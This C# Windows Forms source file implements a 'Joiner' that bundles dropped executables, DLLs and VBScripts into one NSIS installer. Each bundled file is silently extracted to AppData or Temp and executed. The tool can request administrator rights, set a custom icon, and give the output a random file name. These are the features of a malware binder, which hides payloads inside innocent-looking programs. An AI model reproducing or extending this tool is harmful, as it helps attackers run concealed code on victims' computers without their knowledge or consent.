using System;
using System.Drawing;
using System.IO;
using System.Windows.Forms;

namespace Joiner
{
    public partial class Joiner : Form
    {
        private string iconPath;
        private string directoryPath = Application.StartupPath + "\\Temp";
        public Joiner()
        {
            InitializeComponent();
        }

        private void Form1_DragDrop(object sender, DragEventArgs e)
        {
            string[] files = e.Data.GetData(DataFormats.FileDrop) as string[];
            string path = String.Empty;
            foreach (var s in files)
            {
                path = Path.GetFullPath(s);
            }
            if (files[0].EndsWith(".exe") || files[0].EndsWith(".dll") || files[0].EndsWith(".vbs"))
            {
                ListViewItem lvi = new ListViewItem(DateTime.Now.ToShortTimeString());
                lvi.SubItems.Add(path);
                lvi.SubItems.Add("AppData");
                listView1.Items.Add(lvi);
            }
            else if (files[0].EndsWith(".ico"))
            {
                iconPath = path;
                pictureBox1.Image = Bitmap.FromHicon(new Icon(path, new Size(50, 50)).Handle);
                pictureBox1.Refresh();
            }
        }

        private void Form1_DragOver(object sender, DragEventArgs e)
        {
            e.Effect = DragDropEffects.All;
        }

        private void button1_Click(object sender, EventArgs e)
        {
            using (var saveFile = new SaveFileDialog())
            {
                saveFile.Title = "Save file";
                saveFile.Filter = ".exe|*.exe";
                saveFile.FileName = Helper.RandomString(7);

                if (saveFile.ShowDialog() == DialogResult.OK)
                {
                    Directory.CreateDirectory(directoryPath);

                    string silent = runAdmin.Checked ? "OutFile \"out.exe\"\r\nSilentInstall silent\r\nRequestExecutionLevel admin\r\n" : "OutFile \"outJoin.exe\"\r\nSilentInstall silent\r\nRequestExecutionLevel user\r\n";

                    if (addIcon.Checked)
                    {
                        string iconName = iconPath.Remove(0, iconPath.LastIndexOf('\\') + 1);
                        string scrIcon = String.Format("Icon \"{0}\"\r\n!define MUI_ICON \"{1}\"\r\n!define MUI_UNICON \"{2}\"\r\n", iconPath, iconName, iconName);
                        silent += scrIcon;
                    }
                    string files = "";
                    for (int i = 0; i < listView1.Items.Count; i++)
                    {
                        string newFileName = listView1.Items[i].SubItems[1].Text.Remove(0,
                            listView1.Items[i].SubItems[1].Text.LastIndexOf('\\') + 1).Replace(" ", String.Empty);
                        string newPath = directoryPath + "\\" + newFileName;
                                         ;
                        File.Copy(listView1.Items[i].SubItems[1].Text, newPath);
                        string str =
                        string.Format(
                            "Section \"{0}\"\r\nSetOutPath \"${1}\"\r\nSetOverwrite on\r\nFile \"{2}\"\r\nExec ${3}\\{4}\r\nSectionEnd\r\n\r\n", "file" + i, listView1.Items[i].SubItems[2].Text, newPath, listView1.Items[i].SubItems[2].Text, newPath.Remove(0, newPath.LastIndexOf('\\') + 1));
                        files += str;
                    }
                    
                    File.AppendAllText("source.txt", silent + files);
                    Helper.Join();
                    File.Copy(Application.StartupPath + "\\outJoin.exe", saveFile.FileName);
                    Directory.Delete(directoryPath, true);
                    File.Delete("source.txt");
                    File.Delete("outJoin.exe");
                    MessageBox.Show("File join", "Joiner NSIS", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
            }
        }
        
        public string getFileExtension(string fileName)
        {
            return fileName.Substring(fileName.LastIndexOf("."));
        }
        private void appDataToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.SelectedItems)
                item.SubItems[2].Text = "AppData";
        }

        private void tempToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.SelectedItems)
                item.SubItems[2].Text = "Temp";
        }

        private void removeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            while (listView1.SelectedItems.Count != 0)
                listView1.Items.Remove(listView1.SelectedItems[0]);
        }

        private void removeAllToolStripMenuItem_Click(object sender, EventArgs e)
        {
            listView1.Items.Clear();
        }
    }
}
